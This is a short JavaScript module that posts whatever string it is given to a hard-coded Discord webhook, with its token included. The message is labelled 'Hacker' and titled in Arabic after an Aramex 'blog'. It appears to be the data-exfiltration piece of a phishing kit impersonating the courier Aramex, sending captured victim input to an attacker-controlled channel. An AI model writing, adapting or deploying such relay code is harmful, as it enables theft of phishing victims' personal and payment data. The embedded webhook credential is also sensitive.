import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323867735196827689/iF9hwi4h_eFl3sxnI0WnFCnYGv-1Uzuj93oXHC8fuddSzejN8fRc6YlyLJPjDrHF7Sw7",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
